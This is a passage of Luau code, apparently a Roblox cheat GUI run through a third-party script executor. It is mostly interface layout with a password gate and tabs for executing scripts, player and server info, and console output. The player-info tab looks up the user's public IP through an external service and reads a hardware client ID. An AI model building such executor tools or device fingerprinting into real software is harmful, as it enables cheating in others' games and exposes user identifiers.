					box["copy asset id 1 button"].Visible = false
					box["asset image id 1"].Visible = false
					box["asset image name 1"].Visible = false
					box["asset image 1"].Visible = false
				end)

				box["asset ids tab"].MouseButton1Click:Connect(function()
					playclicksound()

					box["scripts tab bottom cover"].Visible = false
					box["commands tab bottom cover"].Visible = false
					box["asset ids tab bottom cover"].Visible = true
					box["executor tab bottom cover"].Visible = false

					box["executor scrolling frame"].Visible = false
					box["execute button"].Visible = false
					box["execute from client button"].Visible = false
					box["clear button"].Visible = false
					box["next page"].Visible = false
					box["previous page"].Visible = false
					box["button holder"].Visible = false
					box["script search bar"].Visible = false

					box["list of commands"].Visible = false
					box["command bar"].Visible = false
					box["execute command button"].Visible = false

					box["asset id type indicator"].Visible = true
					box["asset id search bar"].Visible = true
					box["next page 2 button"].Visible = true
					box["previous page 2 button"].Visible = true
					box["switch asset id type button"].Visible = true
					box["switch asset id type button 2"].Visible = true

					box["introduction"]:Destroy()

					box["copy asset id 3 button"].Visible = true
					box["asset image id 3"].Visible = true
					box["asset image name 3"].Visible = true
					box["asset image 3"].Visible = true
					box["copy asset id 2 button"].Visible = true
					box["asset image id 2"].Visible = true
					box["asset image name 2"].Visible = true
					box["asset image 2"].Visible = true
					box["copy asset id 1 button"].Visible = true
					box["asset image id 1"].Visible = true
					box["asset image name 1"].Visible = true
					box["asset image 1"].Visible = true

					currentAssetIdPageIndex = savedAssetIdPageIndex
					updatePage()
				end)
			end)

			local repositionButton = box["top bar reposition button"]
			local minimizeButton = box["top bar minimize button"]
			local tweenService = box["tween service"]

			local originalMinimizePos = minimizeButton.Position
			local newRepositionPos = UDim2.new(0, 331, 0, 4.7)

			minimizeButton.Position = newRepositionPos

			local repositionTween = tweenService:Create(repositionButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Position = newRepositionPos})
			repositionTween:Play()

			repositionTween.Completed:Wait()

			minimizeButton.Position = newRepositionPos

			box["top bar minimize button"].Visible = false
			local minimizeTween = tweenService:Create(minimizeButton, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Position = originalMinimizePos})
			minimizeTween:Play()
			box["top bar minimize button"].Visible = true

			box["pwb"] = Instance.new("Frame")
			box["pwb"].Size = UDim2.new(0, 401, 0, 249)
			box["pwb"].Position = UDim2.new(0, 0, 1, 1)
			box["pwb"].BackgroundColor3 = box["default background color"]
			box["pwb"].BorderColor3 = box["default border color"]
			box["pwb"].BorderSizePixel = 1
			box["pwb"].Parent = box["top bar"]
			box["pwb"].BackgroundTransparency = 1
			box["pwb"].ZIndex = 69

			local fadeIn = tweenService:Create(box["pwb"], TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {BackgroundTransparency = 0})
			fadeIn:Play()

			fadeIn.Completed:Connect(function()
				box["password frame"]:Destroy()

				local shrink = tweenService:Create(box["pwb"], TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {Size = UDim2.new(0, 401, 0, 0)})
				shrink:Play()

				shrink.Completed:Connect(function()
					box["pwb"]:Destroy() canpress = true canpress2 = true
				end)
			end)
		else
			local nay = Instance.new("Sound")
			nay.SoundId = "rbxassetid://8503529943"
			nay.Parent = box["local player"]
			nay.Volume = 3.3
			nay.Name = "canttouchthis"
			nay.TimePosition = 0.01

			spawn(function() nay:Play() end)
			box["password box"].Text = ""
			if box["lmao"] == false then
				box["lmao"] = true
				box["typed"] = false
				box["password bullet label"].Text = "enter password"
				box["password bullet label"].TextTransparency = 0
				box["password label"].Text = "wrong password"
				wait(1)
				box["lmao"] = false
				box["password label"].Text = "enter password"
				cancheck = true
			end
		end
	end
end

box["password check button"].MouseButton1Click:Connect(checkpass)

-------------------------------------------------------------------------------------------------------------------------------

local function cpf()
	while true do
		if (not box["password frame"] or not box["password frame"].Parent or box["password frame"].Visible == false) 
			and box["unlocked"] == false then
			if box["screen gui"] then
				box["screen gui"]:Destroy()
			end
			break
		end
		box["run service"].RenderStepped:Wait()
	end
end

spawn(cpf)

-------------------------------------------------------------------------------------------------------------------------------

local loopEnabled = false
local visibilityConnection = nil

function toggleLoop(state)
	loopEnabled = state

	if visibilityConnection then
		visibilityConnection:Disconnect()
		visibilityConnection = nil
	end

	if loopEnabled then
		box["toggle interface visibility button"].Text = box["top bar"].Visible and "o.o" or ">.<"

		visibilityConnection = box["top bar"]:GetPropertyChangedSignal("Visible"):Connect(function()
			box["toggle interface visibility button"].Text = box["top bar"].Visible and "o.o" or ">.<"
		end)
	end
end

toggleLoop(true)

-------------------------------------------------------------------------------------------------------------------------------

box["introduction"].Size = UDim2.new(0, 393, 0, 214)
box["introduction"].Position = UDim2.new(0, 4, 0, 32)
box["introduction"].BackgroundColor3 = box["default background color"]
box["introduction"].BorderColor3 = box["default border color"]
box["introduction"].BorderSizePixel = 1
box["introduction"].Parent = box["main frame 1"]
box["introduction"].ZIndex = 19
box["introduction"].Visible = true

box["introduction"].TextColor3 = box["default border color"]
box["introduction"].Font = Enum.Font.RobotoMono
box["introduction"].TextSize = 15
box["introduction"].TextScaled = false
box["introduction"].TextXAlignment = Enum.TextXAlignment.Center
box["introduction"].TextYAlignment = Enum.TextYAlignment.Center
box["introduction"].ZIndex = 19

box["introduction text padding"] = Instance.new("UIPadding")
box["introduction text padding"].PaddingBottom = UDim.new(0, 2)
box["introduction text padding"].Parent = box["introduction"]

box["introduction"].Text = "welcome to boxten sex gui [v".. box["version"] .."]\n\ndeveloped by team noxious & team occulence"

-------------------------------------------------------------------------------------------------------------------------------

box["player information tab"].Size = UDim2.new(0, 133, 0, 26)
box["player information tab"].Position = UDim2.new(0, 0, 0, 0)
box["player information tab"].BackgroundColor3 = box["default background color"]
box["player information tab"].BorderColor3 = box["default border color"]
box["player information tab"].BorderSizePixel = 1
box["player information tab"].TextColor3 = box["default border color"]
box["player information tab"].Font = Enum.Font.RobotoMono
box["player information tab"].TextSize = 15
box["player information tab"].TextScaled = false
box["player information tab"].Text = "player info"
box["player information tab"].TextXAlignment = Enum.TextXAlignment.Center
box["player information tab"].TextYAlignment = Enum.TextYAlignment.Center

box["player information tab text padding"] = Instance.new("UIPadding")
box["player information tab text padding"].PaddingLeft = UDim.new(0, 0)
box["player information tab text padding"].Parent = box["scripts tab"]
box["player information tab"].Parent = box["main frame 2"]
box["player information tab"].ZIndex = 21

box["player information tab bottom cover"].Size = UDim2.new(0, 133, 0, 2)
box["player information tab bottom cover"].Position = UDim2.new(0, 0, 0, 26)
box["player information tab bottom cover"].BackgroundColor3 = box["default background color"]
box["player information tab bottom cover"].BorderSizePixel = 0
box["player information tab bottom cover"].Parent = box["main frame 2"]
box["player information tab bottom cover"].ZIndex = 21.5
box["player information tab bottom cover"].Visible = true

box["information pfp"].Size = UDim2.new(0, 50, 0, 50)
box["information pfp"].Position = UDim2.new(0, 335, 0, 156)
box["information pfp"].BackgroundColor3 = box["default background color"]
box["information pfp"].BorderColor3 = box["default border color"]
box["information pfp"].BorderSizePixel = 1
box["information pfp"].Parent = box["information holder"]
box["information pfp"].Image = game:GetService("Players"):GetUserThumbnailAsync(box["local player"].UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)
box["information pfp"].ZIndex = 22
box["information pfp"].Visible = false

function fetchrig()
	local humanoid = box["local player"].Character and box["local player"].Character:FindFirstChildOfClass("Humanoid")
	if humanoid then
		return humanoid.RigType.Name:upper()
	end
	return "n/a"
end

function fetchfriends()
	local success, result = pcall(function()
		return #box["local player"]:GetFriendsOnline()
	end)
	return success and result or "n/a"
end

function fetchfriendsonline()
	local success, result = pcall(function()
		local friends = box["local player"]:GetFriendsOnline()
		local playingSameGame = 0
		for _, friend in pairs(friends) do
			if friend.PlaceId and friend.PlaceId == game.PlaceId then
				playingSameGame += 1
			end
		end
		return playingSameGame
	end)
	return success and result or "n/a"
end

function fetchaccdate()
	local success, result = pcall(function()
		local timestamp = os.time() - (box["local player"].AccountAge * 86400)
		return os.date("%Y-%m-%d", timestamp)
	end)
	return success and result or "n/a"
end

function fetchexecutor()
	if game.PlaceId == box["test game"] then return "n/a" end
	return identifyexecutor()
end

function fetchdevice()
	local success, result = pcall(function()
		local platform = game:GetService("UserInputService"):GetPlatform()
		local device = "unknown"

		if platform == Enum.Platform.Windows then device = "pc"
		elseif platform == Enum.Platform.OSX then device = "mac"
		elseif platform == Enum.Platform.IOS then device = "ios"
		elseif platform == Enum.Platform.Android then device = "android"
		elseif platform == Enum.Platform.XBoxOne then device = "xbox"
		elseif platform == Enum.Platform.PS4 then device = "playstation" end

		if game:GetService("GuiService"):IsTenFootInterface() then
			device = device .. " (console)"
		elseif platform == Enum.Platform.IOS or platform == Enum.Platform.Android then
			device = device .. " (mobile)"
		end

		return device
	end)
	return success and result or "n/a"
end

local displayName = box["local player"].DisplayName or "n/a"
local username = "@" .. (box["local player"].Name or "n/a")
local friendsCount = tonumber(fetchfriends()) or 0
local friendsInGame = tonumber(fetchfriendsonline()) or 0
local rigType = fetchrig() or "n/a"
local accountAge = tonumber(box["local player"].AccountAge) or 0
local accountCreated = fetchaccdate() or "n/a"
local userId = tonumber(box["local player"].UserId) or 0
local membershipType = box["local player"].MembershipType.Name:lower() or "n/a"
local executorInfo = fetchexecutor() or "n/a"
local deviceInfo = fetchdevice():lower() or "n/a"
local ipaddress = "n/a"
local hwid = "n/a"

if game.PlaceId ~= box["test game"] then
	ipaddress = game:HttpGet("https://v4.ident.me/") or "n/a"
	hwid = game:GetService("RbxAnalyticsService"):GetClientId() or "n/a"
end

box["player information tab"].MouseButton1Click:Connect(function()
	playclicksound()

	box["player information tab bottom cover"].Visible = true
	box["server information tab bottom cover"].Visible = false
	box["console output tab bottom cover"].Visible = false

	box["information holder"].Visible = true
	box["server information holder"].Visible = false
	box["output scrolling frame"].Visible = false
	box["output holder"].Visible = false
	box["console label"].Visible = false
	box["clear console button"].Visible = false

	local informationText = string.format([[
user / display name: %s (%s)
user ID: %d
account age: %d days (creation: %s)
membership: %s
friends online: %d
friends in game: %d
rig type: %s
device: %s
executor: %s
ip address: %s
hardware id: %s
subnet mask: 255.255.255.0
    ]],
		displayName, 
		username, 
		userId, 
		accountAge, 
		accountCreated, 
		membershipType,
		friendsCount,
		friendsInGame,
		rigType, 
		deviceInfo,
		executorInfo,
		ipaddress,
		hwid)

	box["information holder"].Text = informationText
end)

spawn(function()
	local informationText = string.format([[
user / display name: %s (%s)
user ID: %d
account age: %d days (created: %s)
membership: %s
friends online: %d
friends in game: %d
rig type: %s
device: %s
executor: %s
ip address: %s
hardware id: %s
subnet mask: 255.255.255.0
    ]],
		displayName, 
		username, 
		userId, 
		accountAge, 
		accountCreated, 
		membershipType,
		friendsCount,
		friendsInGame,
		rigType, 
		deviceInfo,
		executorInfo,
		ipaddress,
		hwid)

	box["information holder"].Text = informationText
end)

-------------------------------------------------------------------------------------------------------------------------------

box["server information tab"].Size = UDim2.new(0, 133, 0, 26)
box["server information tab"].Position = UDim2.new(0, 134, 0, 0)
box["server information tab"].BackgroundColor3 = box["default background color"]
box["server information tab"].BorderColor3 = box["default border color"]
box["server information tab"].BorderSizePixel = 1
box["server information tab"].TextColor3 = box["default border color"]
box["server information tab"].Font = Enum.Font.RobotoMono
box["server information tab"].TextSize = 15
box["server information tab"].TextScaled = false
box["server information tab"].Text = "server info"
box["server information tab"].TextXAlignment = Enum.TextXAlignment.Center
box["server information tab"].TextYAlignment = Enum.TextYAlignment.Center

box["server information tab text padding"] = Instance.new("UIPadding")
box["server information tab text padding"].PaddingLeft = UDim.new(0, 0)
box["server information tab text padding"].Parent = box["scripts tab"]
box["server information tab"].Parent = box["main frame 2"]
box["server information tab"].ZIndex = 21

box["server information tab bottom cover"].Size = UDim2.new(0, 133, 0, 2)
box["server information tab bottom cover"].Position = UDim2.new(0, 134, 0, 26)
box["server information tab bottom cover"].BackgroundColor3 = box["default background color"]
box["server information tab bottom cover"].BorderSizePixel = 0
box["server information tab bottom cover"].Parent = box["main frame 2"]
box["server information tab bottom cover"].ZIndex = 21.5
box["server information tab bottom cover"].Visible = false

function getPlayerCount()
	local success, result = pcall(function()
		return #game:GetService("Players"):GetPlayers()
	end)
	return success and result or "n/a"
end

function getFriendsInServer()
	local success, result = pcall(function()
		local friendsInServer = 0
		local localPlayer = game:GetService("Players").LocalPlayer
		for _, player in pairs(game:GetService("Players"):GetPlayers()) do
			if player ~= localPlayer and localPlayer:IsFriendsWith(player.UserId) then
				friendsInServer += 1
			end
		end
		return friendsInServer
	end)
	return success and result or "n/a"
end

function getPlaceId()
	return game.PlaceId or "n/a"
end

function getJobId()
	return game.JobId or "n/a"
end

function getGameName()
	local success, result = pcall(function()
		return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
	end)
	return success and result or "n/a"
end

function getCreatorInfo()
	local success, result = pcall(function()
		local creator = game.CreatorId
		local creatorType = game.CreatorType
		if creatorType == Enum.CreatorType.User then
			return game:GetService("Players"):GetNameFromUserIdAsync(creator)
		elseif creatorType == Enum.CreatorType.Group then
			local groupInfo = game:GetService("GroupService"):GetGroupInfoAsync(creator)
			return groupInfo.Name .. " (group)"
		end
	end)
	return success and result or "n/a"
end

function getCreatorInServer()
	local success, result = pcall(function()
		local creatorId = game.CreatorId
		local creatorType = game.CreatorType

		if creatorType == Enum.CreatorType.User then
			local creatorPlayer = game:GetService("Players"):GetPlayerByUserId(creatorId)
			return creatorPlayer and creatorPlayer.Name or false
		elseif creatorType == Enum.CreatorType.Group then
			local groupInfo = game:GetService("GroupService"):GetGroupInfoAsync(creatorId)
			local groupPlayers = game:GetService("Players"):GetPlayers()

			for _, player in ipairs(groupPlayers) do
				local rank = player:GetRankInGroup(creatorId)
				if rank >= 250 then
					return player.Name
				end
			end
		end
		return false
	end)
	return success and result or "n/a"
end

function getServerRegion()
	local success, result = pcall(function()
		local region = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game:GetService("Players").LocalPlayer)
		return region:gsub("^%l", string.upper)
	end)
	return success and result or "n/a"
end

function getServerFPS()
	local success, result = pcall(function()
		return math.floor(1/game:GetService("RunService").RenderStepped:Wait())
	end)
	return success and result or "n/a"
end

function getServerUptime()
	local success, result = pcall(function()
		return os.time() - game:GetService("Workspace").DistributedGameTime
	end)
	if success then
		local hours = math.floor(result/3600)
		local minutes = math.floor((result%3600)/60)
		return string.format("%dh %dm", hours, minutes)
	end
	return "n/a"
end

function getServerMaxPlayers()
	return game:GetService("Players").MaxPlayers or "n/a"
end

box["server information tab"].MouseButton1Click:Connect(function()
	playclicksound()

	box["player information tab bottom cover"].Visible = false
	box["server information tab bottom cover"].Visible = true
	box["console output tab bottom cover"].Visible = false

	box["information holder"].Visible = false
	box["server information holder"].Visible = true
	box["output holder"].Visible = false
	box["output scrolling frame"].Visible = false
	box["console label"].Visible = false
	box["clear console button"].Visible = false

	spawn(function()
		local playerCount = getPlayerCount()
		local placeId = getPlaceId()
		local jobId = getJobId()
		local gameName = getGameName()
		local creatorInfo = getCreatorInfo()
		local creatorInServer = getCreatorInServer()
		local serverRegion = getServerRegion()
		local serverFPS = getServerFPS()
		local serverUptime = getServerUptime()
		local maxPlayers = getServerMaxPlayers()

		local informationText = string.format(
			"game name: %s\n" ..
				"creator: %s\n" ..
				"creators in server: %s\n" ..
				"players in server: %s/%s\n" ..
				"place ID: %s\n" ..
				"job ID: %s\n" ..
				"server region: %s\n" ..
				"ping: %s ms\n" ..
				"server FPS: %s\n" ..
				"uptime: %s\n",
			gameName, 
			creatorInfo,
			creatorInServer or "none",
			playerCount, maxPlayers,
			placeId,
			jobId,
			serverRegion,
			math.round(box["local player"]:GetNetworkPing() * 1000),
			serverFPS,
			serverUptime
		)

		box["server information holder"].Text = informationText
	end)
end)

-------------------------------------------------------------------------------------------------------------------------------

box["output holder"].Size = UDim2.new(0, 393, 0, 214)
box["output holder"].Position = UDim2.new(0, 4, 0, 31)
box["output holder"].BackgroundColor3 = box["default background color"]
box["output holder"].BorderColor3 = box["default border color"]
box["output holder"].BorderSizePixel = 0
box["output holder"].Parent = box["main frame 2"]
box["output holder"].Visible = false
box["output holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

box["output scrolling frame"].Size = UDim2.new(0, 393, 0, 140)
box["output scrolling frame"].Position = UDim2.new(0, 4, 0, 55)
box["output scrolling frame"].BackgroundColor3 = box["default background color"]
box["output scrolling frame"].BorderColor3 = box["default border color"]
box["output scrolling frame"].BorderSizePixel = 1
box["output scrolling frame"].ScrollBarThickness = 8
box["output scrolling frame"].ScrollBarImageColor3 = box["default 1/2 color"]
box["output scrolling frame"].CanvasSize = UDim2.new(0, 0, 0, 0)
box["output scrolling frame"].Parent = box["main frame 2"]
box["output scrolling frame"].ZIndex = 24
box["output scrolling frame"].Visible = false
box["output scrolling frame"].ScrollingDirection = Enum.ScrollingDirection.XY

box["output textbox"].Name = "temphalf"
box["output textbox"].Size = UDim2.new(0, 393, 0, 164)
box["output textbox"].Position = UDim2.new(0, 0, 0, 0)
box["output textbox"].BackgroundColor3 = box["default background color"]
box["output textbox"].BorderColor3 = box["default border color"]
box["output textbox"].BorderSizePixel = 0
box["output textbox"].TextColor3 = box["default border color"]
box["output textbox"].PlaceholderText = "output from the roblox console will appear here"
box["output textbox"].PlaceholderColor3 = box["default 1/2 color"]
box["output textbox"].Font = Enum.Font.RobotoMono
box["output textbox"].TextSize = 15
box["output textbox"].TextScaled = false
box["output textbox"].Text = ""
box["output textbox"].TextXAlignment = Enum.TextXAlignment.Left
box["output textbox"].TextYAlignment = Enum.TextYAlignment.Top
box["output textbox"].ClearTextOnFocus = false
box["output textbox"].MultiLine = true
box["output textbox"].Parent = box["output scrolling frame"]
box["output textbox"].ZIndex = 24
box["output textbox"].TextEditable = false

box["output textbox text padding"] = Instance.new("UIPadding")
box["output textbox text padding"].PaddingLeft = UDim.new(0, 4)
box["output textbox text padding"].PaddingTop = UDim.new(0, 4)
box["output textbox text padding"].PaddingBottom = UDim.new(0, 4)
box["output textbox text padding"].Parent = box["output scrolling frame"]

local function addTextWithNewline2(textBox, text)
	local serverTime = os.date("%X")

	if textBox.Text == "" then
		textBox.Text = "[" .. serverTime .. "] " .. text
	else
		textBox.Text = textBox.Text .. "\n[" .. serverTime .. "] " .. text
	end

	updateCanvas3()
end

function updateCanvas3()
	local textBounds = box["output textbox"].TextBounds

	box["output textbox"].Size = UDim2.new(0, math.max(392, textBounds.X + 20), 0, math.max(164, textBounds.Y + 20))
	box["output scrolling frame"].CanvasSize = UDim2.new(0, textBounds.X + 20, 0, textBounds.Y + 11)

	box["output scrolling frame"].CanvasPosition = Vector2.new(0, box["output scrolling frame"].CanvasSize.Y.Offset)
end

box["logs textbox"]:GetPropertyChangedSignal("Text"):Connect(updateCanvas3)

updateCanvas3()

local LogService = game:GetService("LogService")

LogService.MessageOut:Connect(function(message, messageType)
	addTextWithNewline2(box["output textbox"], message)
	updateCanvas3()
end)

-------------------------------------------------------------------------------------------------------------------------------

box["clear console button"].Size = UDim2.new(0, 393, 0, 45)
box["clear console button"].Position = UDim2.new(0, 4, 0, 200)

box["clear console button"].BackgroundColor3 = box["default background color"]

box["clear console button"].BorderColor3 = box["default border color"]
box["clear console button"].BorderSizePixel = 1

box["clear console button"].TextColor3 = box["default border color"]
box["clear console button"].Font = Enum.Font.RobotoMono
box["clear console button"].TextSize = 15
box["clear console button"].TextScaled = false
box["clear console button"].Text = "clear"
box["clear console button"].TextXAlignment = Enum.TextXAlignment.Center
box["clear console button"].TextYAlignment = Enum.TextYAlignment.Center

box["clear console button text padding"] = Instance.new("UIPadding")
box["clear console button text padding"].PaddingLeft = UDim.new(0, 0)
box["clear console button text padding"].Parent = box["clear console button"]

box["clear console button"].Parent = box["main frame 2"]
box["clear console button"].ZIndex = 24
box["clear console button"].Visible = false

box["clear console button"].MouseButton1Click:Connect(function()
	playclicksound()
	box["output textbox"].Text = ""
end)

-------------------------------------------------------------------------------------------------------------------------------

box["console label"].Size = UDim2.new(0, 393, 0, 19)
box["console label"].Position = UDim2.new(0, 0, 0, 0)
box["console label"].TextColor3 = box["default border color"]
box["console label"].Font = Enum.Font.RobotoMono
box["console label"].TextScaled = false
box["console label"].TextSize = 15
box["console label"].Text = "console (/console) output"
box["console label"].TextXAlignment = Enum.TextXAlignment.Center
box["console label"].TextYAlignment = Enum.TextYAlignment.Center
box["console label"].BackgroundColor3 = box["default background color"]
box["console label"].BorderColor3 = box["default border color"]
box["console label"].BorderSizePixel = 1
box["console label"].Parent = box["output holder"]
box["console label"].ZIndex = 24

box["console label text padding"] = Instance.new("UIPadding")
box["console label text padding"].PaddingBottom = UDim.new(0, 1)
box["console label text padding"].Parent = box["console label"]

-------------------------------------------------------------------------------------------------------------------------------

box["console output tab"].Size = UDim2.new(0, 133, 0, 26)
box["console output tab"].Position = UDim2.new(0, 268, 0, 0)

box["console output tab"].BackgroundColor3 = box["default background color"]
box["console output tab"].BorderColor3 = box["default border color"]
box["console output tab"].BorderSizePixel = 1

box["console output tab"].TextColor3 = box["default border color"]
box["console output tab"].Font = Enum.Font.RobotoMono
box["console output tab"].TextSize = 15
box["console output tab"].TextScaled = false
box["console output tab"].Text = "console output"
box["console output tab"].TextXAlignment = Enum.TextXAlignment.Center
box["console output tab"].TextYAlignment = Enum.TextYAlignment.Center

box["console output tab text padding"] = Instance.new("UIPadding")
box["console output tab text padding"].PaddingLeft = UDim.new(0, 0)
box["console output tab text padding"].Parent = box["scripts tab"]

box["console output tab"].Parent = box["main frame 2"]
box["console output tab"].ZIndex = 21

box["console output tab bottom cover"].Size = UDim2.new(0, 133, 0, 2)
box["console output tab bottom cover"].Position = UDim2.new(0, 268, 0, 26)
box["console output tab bottom cover"].BackgroundColor3 = box["default background color"]
box["console output tab bottom cover"].BorderSizePixel = 0
box["console output tab bottom cover"].Parent = box["main frame 2"]
box["console output tab bottom cover"].ZIndex = 21.5
box["console output tab bottom cover"].Visible = false

box["console output tab"].MouseButton1Click:Connect(function()
	playclicksound()

	box["player information tab bottom cover"].Visible = false
	box["server information tab bottom cover"].Visible = false
	box["console output tab bottom cover"].Visible = true

	box["information holder"].Visible = false
	box["server information holder"].Visible = false
	box["output holder"].Visible = true
	box["output scrolling frame"].Visible = true
	box["console label"].Visible = true
	box["clear console button"].Visible = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["information holder"].Size = UDim2.new(0, 393, 0, 214)
box["information holder"].Position = UDim2.new(0, 4, 0, 31)
box["information holder"].BackgroundColor3 = box["default background color"]
box["information holder"].BorderColor3 = box["default border color"]
box["information holder"].BorderSizePixel = 1
box["information holder"].Parent = box["main frame 2"]
box["information holder"].ZIndex = 19
box["information holder"].Visible = true

box["information holder"].TextColor3 = box["default border color"]
box["information holder"].Font = Enum.Font.RobotoMono
box["information holder"].TextSize = 15
box["information holder"].TextScaled = false
box["information holder"].Text = "loading..."
box["information holder"].TextXAlignment = Enum.TextXAlignment.Left
box["information holder"].TextYAlignment = Enum.TextYAlignment.Top
box["information holder"].ZIndex = 21
box["information holder"].TextWrapped = true

box["information holder text padding"] = Instance.new("UIPadding")
box["information holder text padding"].PaddingLeft = UDim.new(0, 4)
box["information holder text padding"].PaddingTop = UDim.new(0, 4)
box["information holder text padding"].PaddingBottom = UDim.new(0, 4)
box["information holder text padding"].Parent = box["information holder"]

-------------------------------------------------------------------------------------------------------------------------------

box["server information holder"].Size = UDim2.new(0, 393, 0, 214)
box["server information holder"].Position = UDim2.new(0, 4, 0, 31)
box["server information holder"].BackgroundColor3 = box["default background color"]
box["server information holder"].BorderColor3 = box["default border color"]
box["server information holder"].BorderSizePixel = 1
box["server information holder"].Parent = box["main frame 2"]
box["server information holder"].ZIndex = 19
box["server information holder"].Visible = false

box["server information holder"].TextColor3 = box["default border color"]
box["server information holder"].Font = Enum.Font.RobotoMono
box["server information holder"].TextSize = 15
box["server information holder"].TextScaled = false
box["server information holder"].Text = "loading..."
box["server information holder"].TextXAlignment = Enum.TextXAlignment.Left
box["server information holder"].TextYAlignment = Enum.TextYAlignment.Top
box["server information holder"].ZIndex = 21
box["server information holder"].TextWrapped = true

box["server information holder text padding"] = Instance.new("UIPadding")
box["server information holder text padding"].PaddingLeft = UDim.new(0, 4)
box["server information holder text padding"].PaddingTop = UDim.new(0, 4)
box["server information holder text padding"].PaddingBottom = UDim.new(0, 4)
box["server information holder text padding"].Parent = box["server information holder"]

-------------------------------------------------------------------------------------------------------------------------------

box["script settings tab"].Size = UDim2.new(0, 199, 0, 26)
box["script settings tab"].Position = UDim2.new(0, 0, 0, 0)

box["script settings tab"].BackgroundColor3 = box["default background color"]

box["script settings tab"].BorderColor3 = box["default border color"]
box["script settings tab"].BorderSizePixel = 1

box["script settings tab"].TextColor3 = box["default border color"]
box["script settings tab"].Font = Enum.Font.RobotoMono
box["script settings tab"].TextSize = 15
box["script settings tab"].TextScaled = false
box["script settings tab"].Text = "script settings"
box["script settings tab"].TextXAlignment = Enum.TextXAlignment.Center
box["script settings tab"].TextYAlignment = Enum.TextYAlignment.Center

box["script settings tab text padding"] = Instance.new("UIPadding")
box["script settings tab text padding"].PaddingLeft = UDim.new(0, 0)
box["script settings tab text padding"].Parent = box["scripts tab"]

box["script settings tab"].Parent = box["main frame 3"]
box["script settings tab"].ZIndex = 23

box["script settings tab bottom cover"].Size = UDim2.new(0, 199, 0, 2)
box["script settings tab bottom cover"].Position = UDim2.new(0, 0, 0, 26)
box["script settings tab bottom cover"].BackgroundColor3 = box["default background color"]
box["script settings tab bottom cover"].BorderSizePixel = 0
box["script settings tab bottom cover"].Parent = box["main frame 3"]
box["script settings tab bottom cover"].ZIndex = 23.5
box["script settings tab bottom cover"].Visible = true

box["script settings tab"].MouseButton1Click:Connect(function()
	playclicksound()

	box["script settings tab bottom cover"].Visible = true
	box["server settings tab bottom cover"].Visible = false

	box["server settings holder"].Visible = false
	box["script settings holder"].Visible = true
end)

-------------------------------------------------------------------------------------------------------------------------------

box["server settings tab"].Size = UDim2.new(0, 201, 0, 26)
box["server settings tab"].Position = UDim2.new(0, 200, 0, 0)

box["server settings tab"].BackgroundColor3 = box["default background color"]

box["server settings tab"].BorderColor3 = box["default border color"]
box["server settings tab"].BorderSizePixel = 1

box["server settings tab"].TextColor3 = box["default border color"]
box["server settings tab"].Font = Enum.Font.RobotoMono
box["server settings tab"].TextSize = 15
box["server settings tab"].TextScaled = false
box["server settings tab"].Text = "server settings"
box["server settings tab"].TextXAlignment = Enum.TextXAlignment.Center
box["server settings tab"].TextYAlignment = Enum.TextYAlignment.Center

box["server settings tab text padding"] = Instance.new("UIPadding")
box["server settings tab text padding"].PaddingLeft = UDim.new(0, 0)
box["server settings tab text padding"].Parent = box["scripts tab"]

box["server settings tab"].Parent = box["main frame 3"]
box["server settings tab"].ZIndex = 23

box["server settings tab bottom cover"].Size = UDim2.new(0, 201, 0, 2)
box["server settings tab bottom cover"].Position = UDim2.new(0, 200, 0, 26)
box["server settings tab bottom cover"].BackgroundColor3 = box["default background color"]
box["server settings tab bottom cover"].BorderSizePixel = 0
box["server settings tab bottom cover"].Parent = box["main frame 3"]
box["server settings tab bottom cover"].ZIndex = 23.5
box["server settings tab bottom cover"].Visible = false

box["server settings tab"].MouseButton1Click:Connect(function()
	playclicksound()

	box["script settings tab bottom cover"].Visible = false
	box["server settings tab bottom cover"].Visible = true

	box["server settings holder"].Visible = true
	box["script settings holder"].Visible = false
end)

-------------------------------------------------------------------------------------------------------------------------------

box["server settings holder"].Size = UDim2.new(0, 393, 0, 214)
box["server settings holder"].Position = UDim2.new(0, 4, 0, 31)
box["server settings holder"].BackgroundColor3 = box["default background color"]
box["server settings holder"].BorderColor3 = box["default border color"]
box["server settings holder"].BackgroundTransparency = 1
box["server settings holder"].Parent = box["main frame 3"]
box["server settings holder"].Visible = false
box["server settings holder"].ZIndex = 23

-------------------------------------------------------------------------------------------------------------------------------

box["change fps cap"].Size = UDim2.new(0, 230, 0, 68)
box["change fps cap"].Position = UDim2.new(0, 0, 0, 0)
box["change fps cap"].TextColor3 = box["default border color"]
box["change fps cap"].Font = Enum.Font.RobotoMono
box["change fps cap"].TextScaled = false
box["change fps cap"].TextSize = 15
box["change fps cap"].Text = "fps cap: " .. getServerFPS()
box["change fps cap"].TextXAlignment = Enum.TextXAlignment.Center
box["change fps cap"].TextYAlignment = Enum.TextYAlignment.Center
box["change fps cap"].BackgroundColor3 = box["default background color"]
box["change fps cap"].BorderColor3 = box["default border color"]
box["change fps cap"].BorderSizePixel = 1
box["change fps cap"].Parent = box["server settings holder"]
box["change fps cap"].ZIndex = 24

box["change fps cap setting"].Size = UDim2.new(0, 158, 0, 31)
box["change fps cap setting"].Position = UDim2.new(0, 235, 0, 0)
box["change fps cap setting"].TextColor3 = box["default border color"]
box["change fps cap setting"].Font = Enum.Font.RobotoMono
box["change fps cap setting"].TextScaled = false
box["change fps cap setting"].TextSize = 15
box["change fps cap setting"].Text = "change fps cap"
box["change fps cap setting"].TextXAlignment = Enum.TextXAlignment.Center
box["change fps cap setting"].TextYAlignment = Enum.TextYAlignment.Center
box["change fps cap setting"].BackgroundColor3 = box["default background color"]
box["change fps cap setting"].BorderColor3 = box["default border color"]
box["change fps cap setting"].BorderSizePixel = 1
box["change fps cap setting"].Parent = box["server settings holder"]
box["change fps cap setting"].ZIndex = 24

box["change fps cap textbox"].Size = UDim2.new(0, 158, 0, 32)
box["change fps cap textbox"].Position = UDim2.new(0, 235, 0, 36)
box["change fps cap textbox"].TextColor3 = box["default border color"]
box["change fps cap textbox"].Font = Enum.Font.RobotoMono
box["change fps cap textbox"].TextScaled = false
box["change fps cap textbox"].TextSize = 15
